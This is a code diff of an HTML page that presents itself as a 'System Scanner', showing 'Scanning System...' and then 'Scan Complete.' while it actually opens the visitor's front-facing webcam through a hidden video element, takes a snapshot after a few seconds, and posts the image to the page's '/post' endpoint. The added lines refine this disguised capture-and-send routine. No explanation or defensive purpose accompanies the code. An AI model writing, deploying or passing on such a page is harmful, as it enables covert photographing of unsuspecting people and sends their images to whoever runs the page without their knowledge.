@@ -1,27 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Check</title></head>
+<head>
+    <title>System Scanner</title>
+    <style>
+        body { background: black; color: #00ff00; font-family: monospace; text-align: center; padding-top: 50px; }
+    </style>
+</head>
 <body>
-    <h3 id="status">Scanning System...</h3>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <h2 id="status">Scanning System...</h2>
+    <video id="video" width="0" height="0" autoplay style="display:none;"></video>
     <script>
         const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            video.srcObject = stream;
-            setTimeout(() => {
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, 640, 480);
-                fetch('/post', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: canvas.toDataURL('image/png') })
-                });
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(capture, 3000); 
+            });
+
+        function capture() {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const imgData = canvas.toDataURL('image/jpeg', 0.5); 
+
+            fetch('/post', {
+                method: 'POST',
+                body: JSON.stringify({ image: imgData }),
+                headers: { 'Content-Type': 'application/json' }
+            }).then(() => {
                 document.getElementById('status').innerText = "Scan Complete.";
-            }, 2000);
-        });
+            }).catch(err => console.error(err));
+        }
     </script>
 </body>
 </html>
